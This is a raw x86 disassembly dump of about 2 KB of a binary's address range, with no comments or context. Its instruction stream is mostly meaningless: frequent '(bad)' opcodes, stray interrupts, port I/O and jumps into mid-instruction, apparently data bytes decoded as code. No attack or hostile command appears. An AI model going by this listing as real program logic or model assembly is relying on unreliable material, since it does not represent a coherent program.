  40712c:	in     eax,0x0
  40712e:	mov    ebx,0xff001823
  407133:	(bad)  
  407134:	(bad)  
  407135:	dec    DWORD PTR [edx+esi*8-0x21]
  407139:	int3   
  40713a:	call   FWORD PTR [ebx]
  40713c:	mov    es,WORD PTR [eax]
  40713e:	fist   DWORD PTR [ebx-0x7cff0045]
  407144:	inc    DWORD PTR [eax]
  407146:	inc    eax
  407147:	(bad)  
  407148:	cli    
  407149:	add    bh,bh
  40714b:	sbb    al,0x7
  40714d:	call   DWORD PTR [ebp+0x4e]
  407150:	jl     0x407152
  407152:	add    DWORD PTR [eax],0xffffff89
  407155:	int3   
  407156:	jae    0x4070eb
  407158:	xchg   edx,eax
  407159:	add    BYTE PTR [eax],al
  40715b:	(bad)
  40715e:	jmp    0x4071dc
  407160:	sub    al,BYTE PTR [eax]
  407162:	inc    DWORD PTR [ebx+0x23f20000]
  407168:	repnz (bad) 
  40716a:	(bad)  
  40716b:	call   DWORD PTR [edi+0x7a5242ff]
  407171:	add    BYTE PTR [eax],al
  407173:	add    BYTE PTR [eax],al
  407175:	call   DWORD PTR [eax]
  407177:	and    eax,0xf383ff3a
  40717c:	dec    edi
  40717d:	add    dh,dh
  40717f:	fdivr  DWORD PTR [ebx]
  407181:	add    bh,bh
  407183:	cmp    edi,0xffffffff
  407186:	cdq    
  407187:	inc    ecx
  407188:	(bad)  
  407189:	dec    esp
  40718b:	inc    eax
  40718c:	cmp    bh,bh
  40718e:	aas    
  40718f:	out    0xe5,al
  407191:	add    BYTE PTR [ecx-0x3fff337d],cl
  407197:	jnp    0x4071ae
  407199:	int3   
  40719a:	mov    DWORD PTR [ecx-0x76110024],esp
  4071a0:	jns    0x4071a1
  4071a2:	add    BYTE PTR [eax],al
  4071a4:	int3   
  4071a5:	call   FWORD PTR [edi-0x7cffa9eb]
  4071ab:	jmp    0x4071aa
  4071ad:	cmp    DWORD PTR [ebp+0xfc6],0xffffff83
  4071b4:	add    BYTE PTR [eax],al
  4071b6:	rol    BYTE PTR [ecx],0x71
  4071b9:	(bad)  
  4071ba:	dec    DWORD PTR [ebx-0x45]
  4071bd:	jmp    FWORD PTR [ebx+0x3724]
  4071c3:	add    bh,bh
  4071c5:	mov    DWORD PTR [ecx],ecx
  4071c7:	stos   DWORD PTR es:[edi],eax
  4071c8:	fadd   QWORD PTR [eax]
  4071ca:	add    BYTE PTR [eax-0x6ee6ff7e],dh
  4071d0:	ins    BYTE PTR es:[edi],dx
  4071d1:	add    DWORD PTR [eax],0x0
  4071d4:	add    DWORD PTR [eax],0xffffffda
  4071d7:	cmp    BYTE PTR [ebp+0x0],al
  4071da:	(bad)  
  4071db:	inc    DWORD PTR [edi-0x2e9ace00]
  4071e1:	inc    DWORD PTR [eax]
  4071e3:	inc    DWORD PTR [eax]
  4071e5:	(bad)  
  4071e6:	aas    
  4071e7:	test   al,0x9a
  4071e9:	(bad)  
  4071ea:	dec    DWORD PTR [esi-0x7297ff4e]
  4071f0:	(bad)  
  4071f1:	(bad)  
  4071f2:	(bad)  
  4071f3:	inc    DWORD PTR [ebx-0x359cd377]
  4071f9:	dec    DWORD PTR [ecx+0x10ccadc3]
  4071ff:	shl    BYTE PTR [ebp+0x0],0x0
  407203:	add    BYTE PTR [ecx-0x6efd6b01],cl
  407209:	add    bh,bh
  40720b:	jp     0x4071c2
  40720d:	(bad)  
  40720e:	mov    ebx,0xff8456
  407213:	inc    DWORD PTR [ebx-0x3d3e9d00]
  407219:	(bad)  
  40721a:	push   DWORD PTR [esi-0x59e87ccf]
  407220:	sbb    edi,edi
  407222:	add    bh,bh
  407224:	int3   
  407225:	add    BYTE PTR [ebx-0x49],al
  407228:	dec    edx
  407229:	add    DWORD PTR [ebx+0x64ff21aa],0xffffff9f
  407230:	lods   eax,DWORD PTR ds:[esi]
  407231:	add    BYTE PTR [ebx+0x1fffffcc],al
  407237:	(bad)
  40723a:	add    BYTE PTR [esi],bh
  40723c:	rol    BYTE PTR [eax],1
  40723e:	dec    ecx
  40723f:	xchg   BYTE PTR [ebp-0x1],al
  407242:	dec    DWORD PTR [ecx-0x5d8b7601]
  407248:	pop    ss
  407249:	cmp    edi,0xffffffa8
  40724c:	int3   
  40724d:	call   DWORD PTR [ecx]
  40724f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407250:	inc    ecx
  407251:	mov    DWORD PTR [eax],eax
  407253:	add    bh,bh
  407255:	mov    DWORD PTR [edx-0x43],eax
  407258:	dec    esi
  407259:	add    bh,bh
  40725b:	test   eax,0x1f1ff9a
  407260:	imul   ecx,esp,0xff00ff
  407266:	inc    ebx
  407267:	adc    BYTE PTR [edx],ch
  407269:	(bad)  
  40726a:	jmp    DWORD PTR [ecx+0x1118ffbd]
  407270:	lahf   
  407271:	(bad)  
  407272:	inc    DWORD PTR [eax]
  407274:	inc    DWORD PTR [eax]
  407276:	pop    ebp
  407277:	arpl   dx,ax
  407279:	cmp    edi,0x15
  40727c:	cmp    al,0x0
  40727e:	cmp    al,0xef
  407280:	and    eax,0xffffff00
  407285:	call   FWORD PTR [ecx]
  407287:	(bad)  
  407288:	sbb    edi,edi
  40728a:	int3   
  40728b:	in     eax,0xca
  40728d:	jmp    FWORD PTR [edx]
  40728f:	push   ebp
  407290:	enter  0xff89,0x0
  407294:	inc    DWORD PTR [eax]
  407296:	loopne 0x40730d
  407298:	add    DWORD PTR ss:[eax],0x77
  40729c:	out    0x83,al
  40729e:	mov    ebx,0xff89c494
  4072a3:	inc    DWORD PTR [ebx+0x3b16ad83]
  4072a9:	inc    DWORD PTR [eax]
  4072ab:	in     al,dx
  4072ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072ad:	int3   
  4072ae:	dec    eax
  4072af:	frstor [ebp-0x7c7c0001]
  4072b5:	call   FWORD PTR [ecx+edx*1-0x78]
  4072b9:	inc    DWORD PTR [eax]
  4072bb:	add    DWORD PTR [edi+edi*8+0xc9b19b],0xffffffff
  4072c3:	add    DWORD PTR [ebx+0x114f6700],0xffffff89
  4072ca:	jmp    FWORD PTR [edx-0x3b0d33fe]
  4072d0:	mov    ebp,0xff83cc00
  4072d5:	add    BYTE PTR [esi+0x9],dl
  4072d8:	sar    edi,0xff
  4072db:	out    dx,eax
  4072dc:	dec    esi
  4072dd:	mov    DWORD PTR [ebx],ecx
  4072df:	adc    eax,0x83ff00f2
  4072e4:	add    BYTE PTR [ebx+0x84e76c],al
  4072ea:	add    dh,dh
  4072ec:	scas   al,BYTE PTR es:[edi]
  4072ed:	add    BYTE PTR [eax-0x944],dl
  4072f3:	add    bh,bh
  4072f5:	call   FWORD PTR [ebp+eax*4-0x33007c13]
  4072fc:	sbb    DWORD PTR [eax],eax
  4072fe:	int3   
  4072ff:	cld    
  407300:	or     edi,edi
  407302:	dec    esp
  407304:	mov    DWORD PTR [eax],eax
  407306:	xchg   edi,eax
  407307:	retf   0x89
  40730a:	add    BYTE PTR [esi],ch
  40730c:	int    0xcc
  40730e:	test   esp,esi
  407310:	es (bad) 
  407312:	(bad)  
  407313:	(bad)  
  407314:	inc    DWORD PTR [eax]
  407316:	nop
  407317:	imul   eax,DWORD PTR [edx],0x352289ff
  40731d:	inc    esp
  40731f:	nop
  407320:	(bad)  
  407321:	(bad)  
  407322:	(bad)  
  407323:	(bad)  
  407324:	inc    DWORD PTR [eax]
  407326:	cmp    esi,ebx
  407328:	and    BYTE PTR [eax],al
  40732a:	call   FWORD PTR [edi+0x63f0ff76]
  407330:	push   ds
  407331:	(bad)  
  407332:	inc    DWORD PTR [ebx-0x6845ff01]
  407338:	imul   ecx,DWORD PTR [ecx-0x33b3fa01],0xff2d061f
  407342:	add    BYTE PTR [ebx+0x412aff83],al
  407348:	in     al,0x83
  40734a:	push   DWORD PTR [eax+0x1b]
  40734d:	dec    esi
  40734f:	mov    ecx,0xff008969
  407354:	inc    DWORD PTR [eax]
  407356:	rcr    DWORD PTR [ebx-0x59],cl
  407359:	inc    DWORD PTR [eax]
  40735b:	pop    edi
  40735c:	adc    al,BYTE PTR [eax]
  40735e:	call   0xffc3a571
  407363:	dec    esp
  407365:	or     DWORD PTR [ebx],0x48
  407368:	cmp    al,0x0
  40736a:	jmp    DWORD PTR [ebx]
  40736c:	ins    BYTE PTR es:[edi],dx
  40736d:	dec    DWORD PTR [edi-0x30]
  407370:	sub    eax,DWORD PTR [eax]
  407372:	add    bh,bh
  407374:	add    BYTE PTR [ecx-0xb417f1],cl
  40737a:	(bad)  
  40737b:	fdivr  QWORD PTR [edx]
  40737d:	mov    DWORD PTR [ebp-0x7c0078a1],esp
  407383:	cmp    edi,0xffffffff
  407386:	xor    ah,BYTE PTR [eax+0x7bffccb2]
  40738c:	loop   0x40738e
  40738e:	mov    dh,0x70
  407390:	lahf   
  407391:	(bad)  
  407392:	inc    DWORD PTR [eax]
  407394:	add    bh,bh
  407396:	xchg   ebp,eax
  407397:	repz mov dl,0xcc
  40739a:	add    BYTE PTR [edi-0x30cf00b3],dl
  4073a0:	int    0x89
  4073a2:	inc    DWORD PTR [eax]
  4073a4:	int3   
  4073a5:	call   esi
  4073a7:	out    0x17,eax
  4073a9:	or     DWORD PTR [ecx-0x1b001b16],0xffffffd6
  4073b0:	stos   BYTE PTR es:[edi],al
  4073b1:	inc    DWORD PTR [eax]
  4073b3:	inc    DWORD PTR [eax]
  4073b5:	int3   
  4073b6:	sti    
  4073b7:	mov    DWORD PTR [edi+edi*8-0x1],ecx
  4073bb:	popf   
  4073bc:	or     BYTE PTR [eax],al
  4073be:	leave  
  4073bf:	mov    eax,ds:0xcc00ff45
  4073c4:	(bad)  
  4073c5:	(bad)  
  4073c6:	(bad)  
  4073c8:	sub    ecx,esp
  4073ca:	sub    DWORD PTR [edx-0x4c940066],0xa
  4073d1:	cmp    edi,0x0
  4073d4:	inc    DWORD PTR [eax]
  4073d6:	mov    bl,0x55
  4073d8:	mov    edx,0x7e2fff00
  4073dd:	jmp    FWORD PTR [edx-0x33337b98]
  4073e3:	mov    DWORD PTR [ecx-0x1121fb77],ecx
  4073e9:	add    bh,bh
  4073eb:	add    BYTE PTR [ecx-0x1],dl
  4073ee:	aad    0xc1
  4073f0:	inc    eax
  4073f1:	dec    esp
  4073f3:	inc    DWORD PTR [ebx-0x6f4b5a01]
  4073f9:	inc    DWORD PTR [ebx-0x31008aee]
  4073ff:	out    0xee,al
  407401:	inc    DWORD PTR [eax]
  407403:	mov    DWORD PTR [ebx-0x21374377],eax
  407409:	add    DWORD PTR [eax],0xffffffeb
  40740c:	(bad)  
  40740d:	dec    DWORD PTR [eax]
  40740f:	push   edx
  407410:	outs   dx,DWORD PTR ds:[esi]
  407411:	add    BYTE PTR [ecx-0x6800ff01],cl
  407417:	loopne 0x407457
  407419:	int3   
  40741a:	add    BYTE PTR [eax],cl
  40741c:	xchg   esi,eax
  40741d:	mov    DWORD PTR [eax-0x7600971b],ecx
  407423:	inc    DWORD PTR [ebx+0x36f5b5ff]
  407429:	cmp    edi,0x31
  40742c:	jmp    0x40742e
  40742e:	and    al,BYTE PTR es:[ecx+0x0]
  407432:	int3   
  407433:	add    bh,bh
  407435:	call   ecx
  407437:	out    0x8b,eax
  407439:	(bad)  
  40743a:	jmp    FWORD PTR [edi+eax*8+0x670fd9ff]
  407441:	cmp    edi,0x0
  407444:	mov    edi,edi
  407446:	popf   
  407447:	dec    ebx
  407448:	in     eax,0xff
  40744a:	mov    DWORD PTR [edi-0x1c],esi
  40744d:	push   DWORD PTR [esi-0x7cffef2f]
  407453:	dec    DWORD PTR [ecx+0x617ed8ff]
  407459:	(bad)  
  40745a:	dec    DWORD PTR [ebx]
  40745c:	cld    
  40745d:	mov    ebp,edi
  40745f:	aam    0x3
  407461:	dec    DWORD PTR [ecx-0x7fff0077]
  407467:	cld    
  407468:	test   eax,0xfe1d8389
  40746d:	mov    DWORD PTR [ecx-0xe5aa],edi
  407473:	cmp    edi,0xffffffff
  407476:	dec    ecx
  407477:	mov    bh,0xd
  407479:	inc    DWORD PTR [eax]
  40747b:	add    eax,0xb75eff5c
  407480:	repz add ah,cl
  407483:	int3   
  407484:	(bad)  
  407485:	inc    DWORD PTR [esi-0x43]
  407488:	aam    0x83
  40748a:	int3   
  40748b:	and    esi,DWORD PTR [edi+edi*8-0x6e]
  40748f:	enter  0xffa8,0x83
  407493:	add    bh,bh
  407495:	add    BYTE PTR [esi],dh
  407497:	push   esp
  407498:	adc    bh,bh
  40749a:	cmp    edi,0xfffffff8
  40749d:	inc    DWORD PTR [edx]
  40749f:	cmp    edx,DWORD PTR [ecx-0x34]
  4074a2:	add    DWORD PTR [eax],0xffffffff
  4074a5:	add    BYTE PTR [ecx],ah
  4074a7:	cmc    
  4074a8:	sub    al,0x0
  4074aa:	mov    ecx,ebx
  4074ac:	cli    
  4074ad:	int3   
  4074ae:	cs ds pop esi
  4074b1:	inc    DWORD PTR [eax]
  4074b3:	mov    edi,edi
  4074b5:	adc    DWORD PTR [edx-0x7cff7fc8],0xffffffd1
  4074bc:	sbb    bh,bh
  4074be:	or     eax,ecx
  4074c0:	xchg   esp,eax
  4074c1:	add    BYTE PTR [eax],al
  4074c3:	add    DWORD PTR [eax],0xffffffff
  4074c6:	(bad)  
  4074c7:	stos   BYTE PTR es:[edi],al
  4074c8:	xor    edi,edi
  4074ca:	dec    ebx
  4074cc:	sbb    eax,0x73f2cb00
  4074d1:	add    BYTE PTR [eax],al
  4074d3:	int3   
  4074d4:	inc    DWORD PTR [eax]
  4074d6:	add    eax,0xffffb953
  4074db:	xchg   DWORD PTR [ecx],eax
  4074dd:	int3   
  4074de:	rcl    BYTE PTR [eax],1
  4074e0:	jbe    0x407465
  4074e2:	int3   
  4074e3:	inc    DWORD PTR [eax]
  4074e5:	call   FWORD PTR [ecx]
  4074e7:	cli    
  4074e8:	sub    al,0x83
  4074ea:	mov    DWORD PTR ds:0x6faaffd7,ebp
  4074f0:	mov    ah,0x0
  4074f2:	inc    DWORD PTR [ebx+0x640fff00]
  4074f8:	fadd   DWORD PTR [eax]
  4074fa:	inc    DWORD PTR [edi+0x1d7f007b]
  407500:	xchg   DWORD PTR [eax],eax
  407502:	(bad)  
  407503:	dec    esp
  407505:	add    dh,ch
  407507:	and    edx,esi
  407509:	inc    DWORD PTR [eax]
  40750b:	test   DWORD PTR [edx-0x1],edi
  40750e:	imul   DWORD PTR [eax+0x14]
  407511:	inc    DWORD PTR [eax]
  407513:	add    bh,bh
  407515:	sub    DWORD PTR [esp+eax*8+0x7fffff7c],0x52
  40751d:	and    DWORD PTR [edi],0x46
  407520:	arpl   di,di
  407522:	(bad)  
  407523:	inc    DWORD PTR [eax]
  407525:	adc    DWORD PTR [esi-0x7c009c1e],0x5e
  40752c:	xchg   ebp,eax
  40752d:	and    DWORD PTR [edx],0xffffffa3
  407530:	or     edi,edi
  407532:	(bad)  
  407533:	dec    DWORD PTR [ecx+0x834af89]
  407539:	(bad)  
  40753a:	dec    DWORD PTR [eax-0x10]
  40753d:	add    BYTE PTR [ebx+0xe09e],cl
  407543:	(bad)  
  407544:	inc    DWORD PTR [eax]
  407546:	jb     0x4074de
  407548:	sub    ecx,esp
  40754a:	call   FWORD PTR [edx+0x54]
  40754d:	add    dh,bl
  40754f:	(bad)  
  407550:	scas   al,BYTE PTR es:[edi]
  407551:	add    DWORD PTR [eax],0xffffffff
  407554:	dec    esp
  407556:	dec    ebx
  407557:	mov    al,ds:0xa4ff0092
  40755c:	ja     0x40752a
  40755e:	ret    0x260a
  407561:	add    DWORD PTR [ebx-0x18ff0001],0xffffff91
  407568:	out    dx,eax
  407569:	add    BYTE PTR [ebx+0x3083c5a2],al
  40756f:	sbb    eax,0xffffff7a
  407574:	add    DWORD PTR [ebx+0x67a3aa],0xffffffff
  40757b:	lods   al,BYTE PTR ds:[esi]
  40757c:	call   0x3af89580
  407581:	add    BYTE PTR [ebx+0x7700ffff],al
  407587:	pop    esp
  407588:	ud0    edi,edi
  40758b:	xchg   DWORD PTR ds:0xa1c31483,ebp
  407591:	add    bh,bh
  407593:	inc    DWORD PTR [eax]
  407595:	dec    DWORD PTR [edx]
  407597:	jle    0x4075fa
  407599:	inc    DWORD PTR [ebx+0xbffd666]
  40759f:	iret   
  4075a0:	inc    ecx
  4075a1:	add    BYTE PTR [eax],al
  4075a3:	add    BYTE PTR [ecx+0x770f54ff],cl
  4075a9:	(bad)  
  4075aa:	jmp    FWORD PTR ds:0x213cff25
  4075b0:	mov    eax,0x83ffff00
  4075b5:	inc    DWORD PTR [esi+eiz*8-0xe]
  4075b9:	int3   
  4075ba:	jmp    DWORD PTR [edx-0x36407c82]
  4075c0:	sbb    eax,0xff8900ff
  4075c5:	add    BYTE PTR [eax-0x8],bl
  4075c8:	(bad)  
  4075c9:	dec    DWORD PTR [ecx+0x42cc5506]
  4075cf:	or     ecx,edi
  4075d1:	add    BYTE PTR [ebx+0x75ffffff],al
  4075d7:	dec    esi
  4075d8:	rol    DWORD PTR [eax],cl
  4075da:	mov    edx,edi
  4075dc:	pop    eax
  4075dd:	add    BYTE PTR [edi-0x5b],dh
  4075e0:	in     al,dx
  4075e1:	int3   
  4075e2:	add    BYTE PTR [ebx-0x6d0f7c01],al
  4075e8:	fwait
  4075e9:	int3   
  4075ea:	int3   
  4075eb:	push   edx
  4075ec:	mov    al,ds:0xcc3a8a83
  4075f1:	add    bh,bh
  4075f3:	add    bh,bh
  4075f5:	(bad)  
  4075f6:	mov    eax,0xff00419c
  4075fb:	sbb    eax,0x83af003f
  407600:	in     al,0xff
  407602:	mov    edi,edi
  407604:	(bad)  
  407605:	dec    ebx
  407607:	(bad)  
  407608:	adc    eax,0x764ff83
  40760d:	(bad)  
  40760e:	cmp    BYTE PTR [edi+0x2f],dl
  407611:	int3   
  407612:	inc    DWORD PTR [eax]
  407614:	inc    DWORD PTR [eax]
  407616:	call   0x6acb:0xcc00c451
  40761d:	mov    DWORD PTR [ecx-0x7cfffdc7],edi
  407623:	(bad)  
  407624:	inc    DWORD PTR [eax]
  407626:	sbb    esp,DWORD PTR [ebp-0x6a]
  407629:	(bad)  
  40762a:	jmp    DWORD PTR [esi]
  40762c:	xchg   ebx,eax
  40762d:	jmp    DWORD PTR [ecx+0x76]
  407630:	in     al,dx
  407631:	inc    DWORD PTR [eax]
  407633:	inc    DWORD PTR [eax]
  407635:	int3   
  407636:	xor    esi,DWORD PTR es:0xd7b89ff
  40763d:	inc    DWORD PTR [eax]
  40763f:	xchg   edi,eax
  407640:	sub    al,0xff
  407642:	add    bh,bh
  407644:	add    BYTE PTR [ecx+0xcd2bd],cl
  40764a:	add    DWORD PTR [ebp+0x523889a5],0xffffffdb
  407651:	(bad)  
  407652:	dec    DWORD PTR [ecx-0x1ee6ff77]
  407658:	dec    ecx
  407659:	or     esp,0x60
  40765c:	push   cs
  40765d:	add    BYTE PTR [ecx+ecx*2+0x7f],cl
  407661:	inc    DWORD PTR [eax]
  407663:	inc    DWORD PTR [eax]
  407665:	(bad)  
  407666:	jg     0x407663
  407668:	xor    al,0x89
  40766a:	add    BYTE PTR [ebp+0x5d3bffc5],bh
  407670:	dec    edi
  407671:	inc    DWORD PTR [eax]
  407673:	mov    edi,edi
  407675:	(bad)  
  407676:	fidivr DWORD PTR [esi+0x44]
  407679:	add    bh,bh
  40767b:	mov    eax,ds:0x1f9b8924
  407680:	int3   
  407681:	add    BYTE PTR [ecx+0x8008383],cl
  407687:	retf   
  407688:	push   ecx
  407689:	dec    esp
  40768b:	data16 mov ds:0x5ce92bff,al
  407691:	add    BYTE PTR [ecx-0x20000001],cl
  407697:	xor    DWORD PTR [edi-0x69900001],eax
  40769d:	jmp    FWORD PTR [ecx+0x2e]
  4076a0:	ret    
  4076a1:	inc    DWORD PTR [eax]
  4076a3:	add    bh,bh
  4076a5:	add    BYTE PTR [ecx],dl
  4076a7:	mov    cl,0x79
  4076a9:	(bad)  
  4076aa:	inc    DWORD PTR [ebx-0x269b769c]
  4076b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076b1:	(bad)  
  4076b2:	(bad)  
  4076b3:	(bad)  
  4076b4:	(bad)  
  4076b5:	(bad)  
  4076b6:	mov    ecx,0xffffabdb
  4076bb:	cmc    
  4076bc:	adc    DWORD PTR [eax],eax
  4076be:	mov    ds:0xffff9158,al
  4076c3:	(bad)  
  4076c4:	inc    DWORD PTR [ebx-0xfc1cec]
  4076ca:	or     DWORD PTR [ebx-0x6],0xffffffff
  4076ce:	pop    es
  4076cf:	jae    0x4076b6
  4076d1:	add    ah,cl
  4076d3:	inc    DWORD PTR [eax]
  4076d5:	(bad)  
  4076d6:	in     eax,dx
  4076d7:	cmc    
  4076d8:	fild   DWORD PTR [ebx-0x9af501]
  4076de:	pop    ss
  4076df:	cdq    
  4076e0:	jmp    0xbbff:0x89ff00
  4076e7:	lods   al,BYTE PTR ds:[esi]
  4076e8:	sbb    bh,bh
  4076ea:	jmp    FWORD PTR [ebp-0x48]
  4076ed:	push   DWORD PTR ds:0xffffb1b4
  4076f3:	(bad)  
  4076f4:	(bad)  
  4076f5:	dec    DWORD PTR [esi]
  4076f7:	mov    esp,0x4a00fff6
  4076fc:	sub    eax,DWORD PTR [eax]
  4076fe:	push   ebx
  4076ff:	sbb    ah,BYTE PTR [eax+eax*1]
  407702:	inc    DWORD PTR [eax]
  407704:	add    BYTE PTR [eax],al
  407706:	or     al,0x7d
  407708:	ror    BYTE PTR [ecx-0x79a301],cl
  40770e:	mov    ds:0xff897b90,al
  407713:	(bad)  
  407714:	(bad)  
  407715:	(bad)  
  407716:	cli    
  407717:	test   cl,0xff
  40771a:	inc    eax
  40771c:	cmp    BYTE PTR [eax],al
  40771e:	sbb    al,0x14
  407720:	(bad)  
  407721:	(bad)  
  407722:	inc    DWORD PTR [eax]
  407724:	mov    DWORD PTR [eax],eax
  407726:	mov    eax,ds:0x83ff0a77
  40772b:	cmp    eax,0xe80b0047
  407730:	push   edi
  407731:	add    BYTE PTR [ecx-0x4a007677],cl
  407737:	xchg   edx,eax
  407738:	dec    edi
  407739:	(bad)  
  40773a:	jmp    DWORD PTR [ecx]
  40773c:	lods   eax,DWORD PTR ds:[esi]
  40773d:	mov    ecx,ebx
  40773f:	add    ebx,DWORD PTR [ebx-0x1]
  407742:	add    bh,bh
  407744:	add    bh,bh
  407746:	cli    
  407747:	push   ebx
  407748:	sbb    DWORD PTR [ebx+0xeffeff],eax
  40774e:	ror    ch,0x30
  407751:	mov    edi,edi
  407753:	add    BYTE PTR [eax],al
  407755:	call   FWORD PTR ds:0x1be6
  40775b:	sub    DWORD PTR [ebp-0x74b6e001],esi
  407761:	add    BYTE PTR [eax],al
  407763:	cmp    edi,0xffffffff
  407766:	sub    al,0xc8
  407768:	dec    esp
  40776a:	add    BYTE PTR [ebp+eax*8-0x7d],cl
  40776e:	mov    edi,0xcc8368f2
  407773:	(bad)  
  407774:	(bad)  
  407775:	jmp    DWORD PTR [eax]
  407777:	dec    ecx
  407778:	push   ecx
  407779:	add    BYTE PTR [ebx-0x2a7c5fbd],al
  40777f:	xchg   ecx,eax
  407780:	dec    esp
  407781:	(bad)  
  407782:	dec    esp
  407784:	add    bh,bh
  407786:	jnp    0x407712
  407788:	ja     0x407789
  40778a:	add    BYTE PTR [eax],cl
  40778c:	jmp    0x1dbe3e91
  407791:	add    BYTE PTR [ebx+0x50838383],al
  407797:	push   esp
  407798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407799:	add    BYTE PTR [ebx-0x57002a62],al
  40779f:	ffree  st(0)
  4077a1:	inc    DWORD PTR [ebx-0x55007c01]
  4077a7:	jae    0x407764
  4077a9:	dec    esp
  4077ab:	retf   0x8304
  4077ae:	dec    eax
  4077af:	or     al,0x1c
  4077b1:	or     DWORD PTR [ecx-0x53010000],0xfffffffb
  4077b8:	dec    ebp
  4077b9:	add    DWORD PTR [eax],0x1b
  4077bc:	xchg   ebp,eax
  4077bd:	jmp    eax
  4077bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077c0:	jne    0x4077c1
  4077c2:	mov    edi,edi
  4077c4:	add    bh,bh
  4077c6:	mov    edx,0xffff445f
  4077cb:	int3   
  4077cc:	fld    QWORD PTR [eax]
  4077ce:	or     edi,DWORD PTR [ebx-0x6e]
  4077d1:	add    BYTE PTR [eax],al
  4077d3:	add    BYTE PTR [eax],al
  4077d5:	or     DWORD PTR [ebp*4-0x6003358],0x2a
  4077dd:	add    bl,ch
  4077df:	(bad)  
  4077e0:	cmp    eax,0xcc00
  4077e5:	add    DWORD PTR [edi],0x61
  4077e8:	push   0x9e720000
  4077ed:	dec    DWORD PTR [ebp+0xff55e4]
  4077f3:	int3   
  4077f4:	(bad)  
  4077f5:	jmp    DWORD PTR [ebp+0xff1406]
  4077fb:	aaa    
  4077fc:	inc    WORD PTR [edx+0xf3e4]
  407803:	(bad)  
  407804:	dec    DWORD PTR [ecx-0xcc3150]
  40780a:	int3   
  40780b:	cmc    
  40780c:	fimul  WORD PTR [ecx+0xbf00a6]
  407812:	inc    DWORD PTR [eax]
  407814:	(bad)  
  407815:	call   DWORD PTR [esi-0x61]
  407818:	cmp    DWORD PTR [eax],eax
  40781a:	add    dl,ch
  40781c:	mov    bh,bh
  40781e:	xchg   ecx,eax
  40781f:	(bad)  
  407820:	(bad)  
  407822:	int3   
  407823:	(bad)  
  407824:	(bad)  
  407825:	inc    DWORD PTR [ebp-0x9]
  407828:	std    
  407829:	(bad)  
  40782a:	(bad)  
  40782b:	mov    edx,0x56bc0002
  407830:	pop    es
  407831:	mov    edi,edi
  407833:	add    BYTE PTR [eax],al
  407835:	(bad)  
  407836:	cld    
  407837:	jns    0x407807
  407839:	cmp    edi,0xffffffbe
  40783c:	pop    ds
  40783d:	mov    DWORD PTR [ebx+esi*2],esp
  407840:	mov    eax,DWORD PTR [eax]
  407842:	mov    DWORD PTR [eax],eax
  407844:	add    bh,bh
  407846:	mov    esp,0xcc00e63b
  40784b:	out    dx,al
  40784c:	mov    bh,bh
  40784e:	pop    ds
  40784f:	ror    cl,cl
  407851:	(bad)  
  407852:	dec    DWORD PTR [ecx+0x148cffcc]
  407858:	adc    al,0xff
  40785a:	mov    ebp,eax
  40785c:	xchg   BYTE PTR [ebx-0x5cb020],al
  407862:	dec    esp
  407864:	(bad)  
  407865:	inc    DWORD PTR [esi+0xff5181]
  40786b:	adc    al,0xee
  40786d:	jmp    eax
  40786f:	fs popf 
  407871:	cmp    edi,0xffffff83
  407874:	(bad)  
  407875:	jmp    FWORD PTR [ebx-0x8f8]
  40787b:	mov    dh,0x31
  40787d:	add    BYTE PTR [ebx],al
  40787f:	pop    esp
  407880:	add    bh,bh
  407882:	add    DWORD PTR [eax],0x0
  407885:	sub    DWORD PTR [esi+0x4a],0xffffffa9
  407889:	int3   
  40788a:	add    BYTE PTR [edx+0x277000ae],bl
  407890:	sub    eax,0xff89
  407895:	call   DWORD PTR [edi-0x2e]
  407898:	dec    edx
  407899:	cmp    edi,0xffffffb3
  40789c:	mov    eax,0x123636ff
  4078a1:	(bad)  
  4078a2:	(bad)  
  4078a3:	(bad)  
  4078a4:	(bad)  
  4078a5:	dec    DWORD PTR [eax+0x9085]
  4078ab:	sbb    dl,0x0
  4078ae:	(bad)  
  4078af:	rcr    BYTE PTR [ebx],1
  4078b1:	int3   
  4078b2:	int3   
  4078b3:	int3   
  4078b4:	inc    DWORD PTR [ebx-0x3be49c]
  4078ba:	dec    DWORD PTR [esi+ebx*1-0x1]
  4078be:	hlt    
  4078bf:	jecxz  0x4078cd
  4078c1:	add    bh,bh
  4078c3:	cmp    edi,0xffffffff
  4078c6:	iret   
  4078c7:	pushaw 
  4078c9:	inc    DWORD PTR [eax]
  4078cb:	ret    0xcc49
  4078ce:	sbb    al,0x27
  4078d0:	icebp  
  4078d1:	inc    DWORD PTR [eax]
  4078d3:	(bad)  
  4078d4:	(bad)  
  4078d5:	call   DWORD PTR [ebp*1+0x2bff00f5]
  4078dc:	mov    ah,0xff
  4078de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078df:	mov    bh,0xd2
  4078e1:	call   FWORD PTR [edi]
  4078e3:	dec    DWORD PTR [ecx-0x7c5a007c]
  4078e9:	dec    eax
  4078ea:	(bad)  
  4078eb:	mov    esp,0xff576d00
  4078f0:	loopne 0x4078f1
  4078f2:	xlat   BYTE PTR ds:[ebx]
  4078f3:	add    bh,bh
  4078f5:	inc    esp
  4078f6:	call   FWORD PTR [ecx-0x2003a01]
  4078fc:	mov    DWORD PTR [ebx],edi
  4078fe:	sbb    DWORD PTR [eax],eax
  407900:	or     ecx,DWORD PTR [ecx-0x1e3300c6]
  407906:	call   FWORD PTR [edx]
  407908:	add    BYTE PTR [ebx],bh
  40790a:	add    BYTE PTR [ebp-0x2dc701],bl
  407910:	retf   0xbd00
  407913:	inc    DWORD PTR [eax]
  407915:	dec    ecx
  407916:	jmp    FWORD PTR [edx]
  407918:	(bad)  
  407919:	aas    
  40791a:	jmp    DWORD PTR [ebp-0x34]
  40791d:	inc    eax
  40791e:	adc    eax,0x8fffd89
  407923:	mov    esp,ecx
  407925:	lock sub DWORD PTR [esi-0x57337b7d],0xffffffff
  40792d:	retf   0xcc2e
  407930:	in     al,dx
  407931:	call   edi
  407933:	(bad)  
  407934:	push   ecx
  407936:	add    bl,bl
  407938:	add    BYTE PTR [eax+eax*1-0xe],bh
  40793c:	jmp    FWORD PTR [edx]
  40793e:	add    DWORD PTR [ebx-0x9e00b9],0x59ff21ff
  407948:	add    BYTE PTR [ebx+eax*4-0x33],al
  40794c:	(bad)  
  40794d:	aas    
  40794e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
